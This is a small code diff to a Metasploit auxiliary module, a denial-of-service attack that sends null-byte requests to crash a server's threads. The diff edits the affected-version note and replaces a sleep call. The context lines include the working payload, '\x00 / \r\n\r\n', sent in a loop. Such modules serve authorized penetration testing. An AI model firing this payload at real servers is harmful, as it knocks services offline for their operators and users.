@@ -18,7 +18,7 @@ class Metasploit3 < Msf::Auxiliary
 			'Description'    => %q{
 				Sending a request containing null bytes causes a
 			thread to crash.  If you crash all of the threads,
-			the server becomes useless.  Affects versions <= 1.2.0.
+			the server becomes useless.  Affects versions < 1.2.0.
 			},
 			'Author'         =>
 				[
@@ -55,7 +55,7 @@ class Metasploit3 < Msf::Auxiliary
 				print_status("Sending DoS packet to #{rhost}:#{rport}")
 				sock.put("\x00 / \r\n\r\n")
 				disconnect
-				sleep 1
+				select(nil, nil, nil, 1)
 			rescue ::Rex::ConnectionRefused
 				print_status("Unable to connect to #{rhost}:#{rport}.")
 				break
